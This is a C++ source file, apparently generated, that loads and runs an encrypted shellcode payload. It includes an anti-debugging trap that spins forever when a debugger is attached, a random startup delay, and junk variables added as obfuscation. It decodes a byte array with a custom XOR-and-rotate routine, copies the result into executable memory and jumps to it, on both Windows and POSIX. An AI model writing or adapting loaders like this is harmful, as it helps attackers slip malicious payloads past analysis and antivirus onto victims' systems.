/* Unique ID: 14504072866425547489 */
#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdint>
#include <algorithm>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool XcgrtAlTm() {
#ifdef _WIN32
    if (IsDebuggerPresent()) {
        // Infinite loop with anti-optimization
        volatile int* p = (volatile int*)malloc(1024);
        while (1) {
            for (int i = 0; i < 256; i++) {
                p[i] = p[i] ^ 0xDEADBEEF;
                __asm { pause }
            }
        }
    }
#endif
    return true;
}

std::vector<uint8_t> gTBfMuAJI(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    std::vector<uint8_t> result = data;
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= key[i % key.size()];
        result[i] = (result[i] >> 3) | (result[i] << 5);
        result[i] ^= i & 0xFF;
    }
    return result;
}

int main() {
    XcgrtAlTm();

    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 585);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    volatile int A2hoyyHEQoFfha = 849;
    volatile int wW0FGVxGbafuU0 = 439;
    volatile int faQjSO9y1RYaP = 525;
    volatile int nzDXY8pUViy8D_f = 46;
    {
        volatile int XiUI1mQmEDnEXakw = 290;
        XiUI1mQmEDnEXakw += 12;
        XiUI1mQmEDnEXakw *= 5;
    }
    {
        auto IBvN4zIIQSziS0C = []() { return 14; };
        volatile int CyoNVJT9Py = IBvN4zIIQSziS0C();
    }
    volatile int rKWD9opF1IrRA = 606;
    volatile int Cg1wF62f6pxivraH = 960;
    volatile int viLAsbLdywRXW = 297;
    {
        volatile int VJrwSY_gxjGz = 293;
        VJrwSY_gxjGz += 19;
        VJrwSY_gxjGz *= 8;
    }
    std::vector<uint8_t> MYDGe57GgG = {
        0x80, 0x16, 0x6b, 0x87, 0xca, 0x36, 0x8e, 0x8b, 0xc4, 0xf6, 0x12, 0x4a, 0x28, 0xcb, 0x9c, 0x2a, 
        0xfc, 0x5a, 0xef, 0x5d, 0x6a, 0xda, 0x3e, 0xcf, 0xc1, 0x75, 0x51, 0x86, 0x49, 0xc7, 0x09, 0x94, 
        0x03, 0x5e, 0x73, 0x27, 0x78, 0x96, 0xb6, 0x09, 0xa4, 0xac, 0xe2, 0x40, 0x30, 0x63, 0x26, 0xc2, 
        0xdd, 0x9b, 0xee, 0x5c
    };

    std::vector<uint8_t> kivB3fioA1zeqV1 = {
        0x44, 0x8a, 0x44, 0xe3, 0xf9, 0x0f, 0x62, 0xb1, 0xf8, 0xdf, 0x77, 0x4d, 0xf7, 0xac, 0x72, 0xc9, 
        0xd4, 0x3b, 0xfc, 0xe7, 0xaa, 0x81, 0x60, 0x3b, 0x5d, 0xe4, 0x05, 0xd6, 0x8a, 0x3d, 0x8d, 0x03
    };

    volatile int olr9jiwqIQkHps = 24;
    volatile int UA05S5RCUa = 380;
    {
        volatile int x2CBQIs9S1OY0 = 159;
        x2CBQIs9S1OY0 += 49;
        x2CBQIs9S1OY0 *= 10;
    }
    volatile int MNPOY0Krp = 96;
    volatile int RydjfAuPPSDUQ3 = 433;
    std::vector<uint8_t> N4NS4s0ALAMw4R2 = gTBfMuAJI(MYDGe57GgG, kivB3fioA1zeqV1);

#ifdef _WIN32
    LPVOID O9y0I_7tpZ = VirtualAlloc(NULL, N4NS4s0ALAMw4R2.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (O9y0I_7tpZ) {
        memcpy(O9y0I_7tpZ, N4NS4s0ALAMw4R2.data(), N4NS4s0ALAMw4R2.size());
        ((void(*)())O9y0I_7tpZ)();
    }
#else
    void* O9y0I_7tpZ = mmap(NULL, N4NS4s0ALAMw4R2.size(), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (O9y0I_7tpZ != MAP_FAILED) {
        memcpy(O9y0I_7tpZ, N4NS4s0ALAMw4R2.data(), N4NS4s0ALAMw4R2.size());
        ((void(*)())O9y0I_7tpZ)();
    }
#endif
    return 0;
}
